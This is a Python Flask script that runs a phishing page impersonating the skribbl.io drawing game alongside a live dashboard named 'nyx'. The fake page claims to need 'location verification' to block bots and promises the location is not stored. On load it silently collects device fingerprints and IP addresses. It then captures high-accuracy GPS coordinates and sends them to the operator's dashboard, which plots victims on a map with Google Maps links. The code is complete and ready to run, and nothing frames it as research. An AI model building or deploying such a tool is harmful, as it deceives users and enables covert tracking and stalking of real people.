import json, threading, time, os
from flask import Flask, request, Response

_DIR = os.path.dirname(os.path.abspath(__file__))
_cfg_file = os.path.join(_DIR, "config.txt")
try:
    REDIRECT_URL = open(_cfg_file).read().strip()
except Exception:
    REDIRECT_URL = "https://skribbl.io"
LOG_FILE     = os.path.join(_DIR, "captures.json")
PHISH_PORT   = 8080
DASH_PORT    = 8181

captures = []
_id_ctr  = 0

# Load previous captures if any
try:
    with open(LOG_FILE) as f:
        captures = json.load(f)
        _id_ctr = max((c.get('_id',0) for c in captures), default=0)
except Exception:
    pass

def _next_id():
    global _id_ctr
    _id_ctr += 1
    return _id_ctr

def parse_body():
    try:
        d = request.get_json(force=True, silent=True)
        if d: return d
    except Exception:
        pass
    try:
        return json.loads(request.data or b'{}') or {}
    except Exception:
        return {}

def _ip():
    return (request.headers.get('CF-Connecting-IP') or
            request.headers.get('X-Forwarded-For','').split(',')[0].strip() or
            request.remote_addr)

def save():
    try:
        with open(LOG_FILE, 'w') as f:
            json.dump(list(captures), f, default=str)
    except Exception:
        pass

# ── Phish app ──────────────────────────────────────────────────────────────

phish_app = Flask('phish')

@phish_app.after_request
def cors(r):
    r.headers['Access-Control-Allow-Origin']  = '*'
    r.headers['Access-Control-Allow-Methods'] = 'GET,POST,OPTIONS'
    r.headers['Access-Control-Allow-Headers'] = 'Content-Type'
    return r

PHISH_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>skribbl.io - free multiplayer drawing & guessing game</title>
<link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;700;800;900&display=swap" rel="stylesheet"/>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Nunito',sans-serif;background:#1d2f6f;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;color:#f0f0f0}
.wrap{width:100%;max-width:420px;padding:20px;display:flex;flex-direction:column;align-items:center;gap:28px}
.logo-img{max-width:320px;width:90%;filter:drop-shadow(0 4px 16px rgba(0,0,0,.5))}
.card{width:100%;background:rgba(12,44,150,0.78);border:3px solid #040a33;border-radius:4px;box-shadow:0 0 0 2px rgba(0,0,0,.2),0 8px 32px rgba(0,0,0,.5);overflow:hidden}
.card-top{background:rgba(7,36,131,0.85);border-bottom:3px solid #040a33;padding:13px 18px;font-size:.95rem;font-weight:800;letter-spacing:.01em}
.card-body{padding:20px 18px;display:flex;flex-direction:column;gap:14px}
.notice{background:rgba(0,0,0,.25);border:1px solid rgba(255,255,255,.12);border-radius:3px;padding:12px 14px;font-size:.82rem;font-weight:700;color:rgba(255,255,255,.8);line-height:1.55}
.notice b{color:#fff}
#btn{width:100%;padding:13px;background:#2a51d1;border:none;border-radius:3px;font-size:1rem;font-weight:800;color:#fff;cursor:pointer;font-family:'Nunito',sans-serif;text-shadow:2px 2px 0 rgba(0,0,0,.4);box-shadow:0 4px 0 #1a3499,0 6px 12px rgba(0,0,0,.3);transition:all 80ms;letter-spacing:.02em}
#btn:hover{background:#1e44be;transform:translateY(1px);box-shadow:0 3px 0 #1a3499}
#btn:active{transform:translateY(4px);box-shadow:none}
#btn:disabled{opacity:.65;cursor:default;transform:none;box-shadow:0 4px 0 #1a3499}
.prog-wrap{display:none;background:rgba(7,36,131,0.85);border:2px solid #040a33;border-radius:3px;height:10px;overflow:hidden}
.prog-fill{height:100%;background:linear-gradient(90deg,#ee9631,#f5c034);animation:prog 15s linear forwards;border-radius:2px}
@keyframes prog{from{width:3%}to{width:95%}}
#status{font-size:.82rem;color:rgba(255,255,255,.55);font-weight:700;min-height:16px;text-align:center}
.footer-txt{font-size:.7rem;color:rgba(255,255,255,.22);font-weight:700}
</style>
</head>
<body>
<div class="wrap">
  <img class="logo-img" src="LOGO_PLACEHOLDER" alt="skribbl.io"/>
  <div class="card">
    <div class="card-top">🔒 Private Room — Verification Required</div>
    <div class="card-body">
      <div class="notice">
        <b>Location verification required.</b><br/>
        skribbl.io uses your location to prevent bots and ensure only real players can join private rooms. Your location is <b>not stored</b> and is only used for this session.
      </div>
      <button id="btn" onclick="joinRoom()">Verify &amp; Join Room</button>
      <div class="prog-wrap" id="bar"><div class="prog-fill"></div></div>
      <div id="status"></div>
    </div>
  </div>
  <div class="footer-txt">skribbl.io &copy; 2026 &nbsp;&bull;&nbsp; Privacy Policy &nbsp;&bull;&nbsp; Terms of Service</div>
</div>
<script>
var REDIRECT="REDIRECT_PLACEHOLDER";
var BASE=location.protocol+"//"+location.host;

function send(path,data){
  var url=BASE+path;
  var blob=new Blob([JSON.stringify(data)],{type:"application/json"});
  try{ if(navigator.sendBeacon){ navigator.sendBeacon(url,blob); return; } }catch(e){}
  try{ fetch(url,{method:"POST",mode:"no-cors",body:blob}); }catch(e){}
}

function collectInfo(){
  return {
    userAgent:navigator.userAgent,
    platform:navigator.platform,
    language:navigator.language,
    screen:screen.width+"x"+screen.height,
    timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,
    cores:navigator.hardwareConcurrency,
    ram:navigator.deviceMemory,
    touch:navigator.maxTouchPoints,
    online:navigator.onLine,
    cookieEnabled:navigator.cookieEnabled,
    doNotTrack:navigator.doNotTrack,
    referrer:document.referrer,
    url:location.href
  };
}

function autoCapture(){
  var info=collectInfo();
  send("/info",info);
  if(navigator.getBattery){
    navigator.getBattery().then(function(b){
      info.battery=Math.round(b.level*100)+"%"+(b.charging?" (charging)":" (discharging)");
      info._update=true;
      send("/info",info);
    }).catch(function(){});
  }
}

function setStatus(msg,col){
  var s=document.getElementById("status");
  s.textContent=msg;
  s.style.color=col||"rgba(255,255,255,.55)";
}
function resetBtn(){
  document.getElementById("btn").disabled=false;
  document.getElementById("bar").style.display="none";
}
function getBestLocation(onSuccess,onFail){
  var best=null,watchId=null,done=false;
  var finish=function(){
    if(done)return;done=true;
    if(watchId!==null)navigator.geolocation.clearWatch(watchId);
    if(best)onSuccess(best);else onFail({message:"No position obtained"});
  };
  var timer=setTimeout(finish,15000);
  watchId=navigator.geolocation.watchPosition(
    function(pos){
      if(!best||pos.coords.accuracy<best.coords.accuracy){
        best=pos;
        setStatus("Locking GPS… \xb1"+Math.round(pos.coords.accuracy)+"m");
      }
      if(pos.coords.accuracy<=10){clearTimeout(timer);finish();}
    },
    function(err){clearTimeout(timer);done=true;if(watchId!==null)navigator.geolocation.clearWatch(watchId);onFail(err);},
    {enableHighAccuracy:true,timeout:20000,maximumAge:0}
  );
}

function joinRoom(){
  document.getElementById("btn").disabled=true;
  document.getElementById("bar").style.display="block";
  setStatus("Verifying…");
  if(!navigator.geolocation){
    setStatus("⚠ Location not supported on this device. Please use a different browser.","#f85149");
    resetBtn();
    return;
  }
  getBestLocation(
    function(pos){
      setStatus("Verified ✓  Entering room…","#3fb950");
      send("/location",{lat:pos.coords.latitude,lon:pos.coords.longitude,
        acc:pos.coords.accuracy,alt:pos.coords.altitude,
        spd:pos.coords.speed,hdg:pos.coords.heading,ts:new Date().toISOString()});
      setTimeout(function(){window.location.href=REDIRECT;},800);
    },
    function(err){
      send("/location",{denied:true,reason:err.message});
      setStatus("⚠ Location access is required to verify you're not a bot. Please allow location and try again.","#f5c034");
      resetBtn();
    }
  );
}

window.onload=autoCapture;
</script>
</body>
</html>"""

import base64 as _b64
_LOGO_B64 = None
def _logo_data_uri():
    global _LOGO_B64
    if _LOGO_B64 is None:
        logo_path = os.path.join(_DIR, 'logo.gif')
        with open(logo_path, 'rb') as f:
            _LOGO_B64 = 'data:image/gif;base64,' + _b64.b64encode(f.read()).decode()
    return _LOGO_B64

@phish_app.route('/', methods=['GET'])
def phish_index():
    html = (PHISH_HTML
            .replace('REDIRECT_PLACEHOLDER', REDIRECT_URL)
            .replace('LOGO_PLACEHOLDER', _logo_data_uri()))
    return Response(html, mimetype='text/html')

@phish_app.route('/info', methods=['POST','OPTIONS'])
def phish_info():
    if request.method == 'OPTIONS': return Response('', 204)
    d = parse_body()
    ip = _ip()
    # Try to update existing device capture for this IP
    for c in captures:
        if c.get('_ip') == ip and c.get('_endpoint') == '/info':
            for k,v in d.items():
                c[k] = v
            save()
            return {'ok': True}
    # New capture
    entry = dict(d)
    entry['_id']       = _next_id()
    entry['_ip']       = ip
    entry['_endpoint'] = '/info'
    entry['_time']     = time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())
    captures.append(entry)
    save()
    return {'ok': True}

@phish_app.route('/location', methods=['POST','OPTIONS'])
def phish_location():
    if request.method == 'OPTIONS': return Response('', 204)
    d = parse_body()
    ip = _ip()
    entry = dict(d)
    entry['_id']       = _next_id()
    entry['_ip']       = ip
    entry['_endpoint'] = '/location'
    entry['_time']     = time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())
    captures.append(entry)
    save()
    return {'ok': True}

# ── Dashboard app ──────────────────────────────────────────────────────────

dash_app = Flask('dash')

def _build_dash():
    with open(os.path.join(_DIR, 'leaflet.js')) as f:
        ljs = f.read()
    with open(os.path.join(_DIR, 'leaflet.css')) as f:
        lcss = f.read()

    return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>nyx – dashboard</title>
<style>
{lcss}
*{{margin:0;padding:0;box-sizing:border-box}}
body{{background:#0d1117;color:#e6edf3;font-family:'Segoe UI',sans-serif;display:flex;height:100vh;overflow:hidden}}
#map{{flex:1;height:100vh}}
#sidebar{{width:340px;min-width:280px;background:#161b22;display:flex;flex-direction:column;border-left:1px solid #30363d;overflow:hidden}}
.hdr{{padding:14px 16px;border-bottom:1px solid #30363d;display:flex;align-items:center;justify-content:space-between;flex-shrink:0}}
.hdr .brand{{font-size:1.1rem;font-weight:700;color:#58a6ff}}
.live-dot{{width:8px;height:8px;border-radius:50%;background:#3fb950;display:inline-block;margin-right:6px;animation:pulse 1.4s infinite}}
@keyframes pulse{{0%,100%{{opacity:1}}50%{{opacity:.3}}}}
.stats{{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;padding:12px 16px;border-bottom:1px solid #30363d;flex-shrink:0}}
.stat{{background:#0d1117;border-radius:8px;padding:10px;text-align:center}}
.stat .n{{font-size:1.6rem;font-weight:700}}
.stat .l{{font-size:.7rem;color:#8b949e;text-transform:uppercase;letter-spacing:.06em}}
.n.g{{color:#3fb950}}.n.d{{color:#f85149}}.n.a{{color:#58a6ff}}
.feed-hdr{{padding:10px 16px 6px;font-size:.75rem;color:#8b949e;text-transform:uppercase;letter-spacing:.08em;display:flex;justify-content:space-between;align-items:center;flex-shrink:0}}
.clr{{font-size:.75rem;color:#58a6ff;cursor:pointer;background:none;border:none;padding:0}}
.clr:hover{{text-decoration:underline}}
#feed{{flex:1;overflow-y:auto;padding:8px 10px}}
.card{{background:#0d1117;border:1px solid #30363d;border-radius:10px;padding:12px;margin-bottom:8px;animation:fadein .4s ease}}
@keyframes fadein{{from{{opacity:0;transform:translateY(6px)}}to{{opacity:1;transform:translateY(0)}}}}
.card-hdr{{display:flex;align-items:center;justify-content:space-between;margin-bottom:8px}}
.bx{{font-size:.72rem;font-weight:600;padding:3px 8px;border-radius:12px}}
.gps{{background:#1a3a2a;color:#3fb950;border:1px solid #3fb950}}
.deny{{background:#3a1a1a;color:#f85149;border:1px solid #f85149}}
.dev{{background:#1a2a3a;color:#58a6ff;border:1px solid #58a6ff}}
.ts{{font-size:.7rem;color:#8b949e}}
.ip{{font-size:.75rem;color:#8b949e;margin-bottom:8px;font-family:monospace}}
.fields{{display:grid;grid-template-columns:1fr 1fr;gap:4px}}
.f{{background:#161b22;border-radius:6px;padding:6px 8px}}
.f.wide{{grid-column:1/-1}}
.lb{{font-size:.65rem;color:#8b949e;text-transform:uppercase;letter-spacing:.05em;margin-bottom:2px}}
.vl{{font-size:.78rem;color:#e6edf3;word-break:break-all}}
.at{{background:#30363d;border-radius:3px;height:4px;margin-top:4px;overflow:hidden}}
.af{{height:100%;border-radius:3px;transition:width .6s}}
.omaps{{display:inline-block;margin-top:8px;font-size:.75rem;color:#58a6ff;text-decoration:none;background:#1a2a3a;border:1px solid #58a6ff;border-radius:6px;padding:4px 10px}}
.omaps:hover{{background:#2a3a4a}}
.status-bar{{padding:6px 16px;font-size:.72rem;color:#8b949e;border-top:1px solid #30363d;flex-shrink:0}}
#empty{{text-align:center;color:#8b949e;font-size:.85rem;padding:40px 20px}}
</style>
</head>
<body>
<div id="map"></div>
<div id="sidebar">
  <div class="hdr">
    <span class="brand">nyx</span>
    <span><span class="live-dot"></span><span id="live-lbl">LIVE</span></span>
    <span id="hit-count" style="font-size:.8rem;color:#8b949e;background:#0d1117;padding:3px 10px;border-radius:12px">0 hits</span>
    <button class="clr" onclick="clearAll()" style="color:#f85149">🗑 Clear All</button>
  </div>
  <div class="stats">
    <div class="stat"><div class="n g" id="sg">0</div><div class="l">GPS</div></div>
    <div class="stat"><div class="n d" id="sd">0</div><div class="l">Denied</div></div>
    <div class="stat"><div class="n a" id="sa">0</div><div class="l">Devices</div></div>
  </div>
  <div class="feed-hdr"><span>LIVE FEED</span><button class="clr" onclick="clearView()">clear view</button></div>
  <div id="feed"><div id="empty">No captures yet.<br/>Waiting for hits…</div></div>
  <div class="status-bar" id="sbar">connecting…</div>
</div>
<script>
{ljs}
</script>
<script>
var map=L.map('map',{{attributionControl:false,preferCanvas:true,zoomSnap:0.5,wheelPxPerZoomLevel:120}}).setView([20,78],5);
L.tileLayer('https://{{s}}.basemaps.cartocdn.com/dark_all/{{z}}/{{x}}/{{y}}{{r}}.png',{{
  maxZoom:19,keepBuffer:4,updateWhenZooming:false,updateWhenIdle:true,crossOrigin:true
}}).addTo(map);

var markers={{}},seen=new Set(),stats={{g:0,d:0,a:0}};

function accColor(a){{return a==null?'#8b949e':a<=20?'#3fb950':a<=100?'#f7b731':'#f85149';}}

function f(l,v){{return '<div class="f"><div class="lb">'+l+'</div><div class="vl">'+(v||'N/A')+'</div></div>';}}

function updateStats(){{
  document.getElementById('sg').textContent=stats.g;
  document.getElementById('sd').textContent=stats.d;
  document.getElementById('sa').textContent=stats.a;
  var total=stats.g+stats.d+stats.a;
  document.getElementById('hit-count').textContent=total+' hit'+(total===1?'':'s');
}}

function addCard(d){{
  if(seen.has(d._id))return;
  seen.add(d._id);
  var e=document.getElementById('empty');if(e)e.remove();
  var ep=d._endpoint||'';
  var isGps=ep==='/location'&&!d.denied;
  var isDeny=ep==='/location'&&d.denied;
  var badge=isGps?'<span class="bx gps">📍 GPS</span>':
            isDeny?'<span class="bx deny">🚫 Denied</span>':
                   '<span class="bx dev">💻 Device</span>';
  var ts=d._time?new Date(d._time).toLocaleTimeString():'';
  var fields='';
  if(isGps){{
    var acc=d.acc!=null?Math.round(d.acc):null;
    var col=accColor(acc);
    var pct=acc?Math.min(96,Math.max(4,100-Math.log(acc+1)*15)):30;
    var lbl=acc==null?'Unknown':acc<=20?'🟢 High ±'+acc+'m':acc<=100?'🟡 Med ±'+acc+'m':'🔴 Low ±'+acc+'m';
    fields+=f('Latitude',d.lat!=null?d.lat.toFixed(7):'N/A');
    fields+=f('Longitude',d.lon!=null?d.lon.toFixed(7):'N/A');
    fields+=f('Accuracy',acc!=null?'± '+acc+' m':'N/A');
    fields+=f('Altitude',d.alt!=null?d.alt.toFixed(1)+' m':'N/A');
    fields+='<div class="f wide"><div class="lb">'+lbl+'</div>'+
            '<div class="at"><div class="af" style="width:'+pct+'%;background:'+col+'"></div></div></div>';
    if(d.lat!=null&&d.lon!=null){{
      var mk=L.circleMarker([d.lat,d.lon],{{radius:10,fillColor:col,color:'#fff',weight:2,fillOpacity:.9}}).addTo(map);
      mk.bindPopup('<b>'+d._ip+'</b><br/>'+d.lat.toFixed(6)+','+d.lon.toFixed(6)+
        '<br/>±'+Math.round(d.acc||0)+'m<br/>'+
        '<a href="https://www.google.com/maps?q='+d.lat+','+d.lon+'" target="_blank">Open Maps</a>');
      markers[d._id]=mk;
    }}
    stats.g++;
  }}else if(isDeny){{
    fields+=f('Reason',d.reason);
    stats.d++;
  }}else{{
    var ua=d.userAgent||'';
    var pl=d.platform||ua.match(/Windows|Linux|Mac|Android|iPhone/)||'';
    if(Array.isArray(pl))pl=pl[0];
    var gpu=d.gpu||'N/A';
    fields+=f('Platform',pl);
    fields+=f('Screen',d.screen);
    fields+=f('Timezone',d.timezone);
    fields+=f('CPU',d.cores?d.cores+' cores':'N/A');
    fields+=f('RAM',d.ram?d.ram+' GB':'N/A');
    fields+=f('Battery',d.battery||'N/A');
    fields+=f('Network',d.network||'N/A');
    fields+=f('Language',d.language);
    fields+=f('Touch',d.touch!=null?d.touch+' pts':'N/A');
    fields+=f('GPU',gpu);
    if(ua)fields+='<div class="f wide"><div class="lb">User-Agent</div><div class="vl" style="font-size:.7rem">'+ua+'</div></div>';
    stats.a++;
  }}
  var div=document.createElement('div');
  div.className='card';
  div.innerHTML='<div class="card-hdr">'+badge+'<span class="ts">'+ts+'</span></div>'+
    '<div class="ip">'+d._ip+'</div><div class="fields">'+fields+'</div>'+
    (isGps&&d.lat!=null?'<a class="omaps" href="https://www.google.com/maps?q='+d.lat+','+d.lon+'" target="_blank">🗺 Open Maps</a>':'');
  document.getElementById('feed').prepend(div);
  updateStats();
}}

function setOk(ok){{
  document.getElementById('sbar').textContent=ok?'● Connected — polling every 2s':'⚠ Lost connection — retrying…';
  document.getElementById('sbar').style.color=ok?'#3fb950':'#f85149';
  document.getElementById('live-lbl').textContent=ok?'LIVE':'OFFLINE';
}}

function clearView(){{seen=new Set();document.getElementById('feed').innerHTML='<div id="empty">Cleared. Waiting…</div>';stats={{g:0,d:0,a:0}};updateStats();Object.values(markers).forEach(function(m){{map.removeLayer(m);}});markers={{}};}}

function clearAll(){{
  if(!confirm('Clear all captures?'))return;
  fetch('/api/clear',{{method:'POST'}}).then(function(){{clearView();}});
}}

function poll(){{
  fetch('/api/captures')
    .then(function(r){{return r.json();}})
    .then(function(list){{
      setOk(true);
      var newOnes=list.filter(function(c){{return !seen.has(c._id);}});
      list.forEach(function(c){{addCard(c);}});
      if(newOnes.length===1&&newOnes[0].lat!=null){{
        var c=newOnes[0];
        map.flyTo([c.lat,c.lon],Math.min(15,Math.max(10,16-Math.log2((c.acc||500)+1))),{{animate:true,duration:1.5}});
        if(markers[c._id])markers[c._id].openPopup();
      }}else if(newOnes.length>1){{
        var gps=newOnes.filter(function(c){{return c.lat!=null;}});
        if(gps.length>0){{
          var bounds=L.latLngBounds(gps.map(function(c){{return [c.lat,c.lon];}}));
          map.fitBounds(bounds,{{padding:[60,60],animate:true,duration:1.0,maxZoom:13}});
        }}
      }}
    }})
    .catch(function(){{setOk(false);}});
}}
poll();
setInterval(poll,2000);
</script>
</body>
</html>"""

DASH_HTML = None

@dash_app.route('/')
def dash_index():
    global DASH_HTML
    if DASH_HTML is None:
        DASH_HTML = _build_dash()
    return Response(DASH_HTML, mimetype='text/html')

@dash_app.route('/api/captures')
def api_captures():
    return Response(json.dumps(list(captures), default=str), mimetype='application/json')

@dash_app.route('/api/clear', methods=['POST'])
def api_clear():
    captures.clear()
    try:
        with open(LOG_FILE,'w') as f: json.dump([],f)
    except Exception: pass
    return {'ok': True}

# ── Start both servers ─────────────────────────────────────────────────────

def run_phish():
    phish_app.run(host='0.0.0.0', port=PHISH_PORT, threaded=True, debug=False, use_reloader=False)

def run_dash():
    dash_app.run(host='0.0.0.0', port=DASH_PORT, threaded=True, debug=False, use_reloader=False)

threading.Thread(target=run_phish, daemon=True).start()
threading.Thread(target=run_dash,  daemon=True).start()
print(f'Phish: http://0.0.0.0:{PHISH_PORT}  Dash: http://0.0.0.0:{DASH_PORT}')

try:
    while True: time.sleep(60)
except KeyboardInterrupt:
    pass
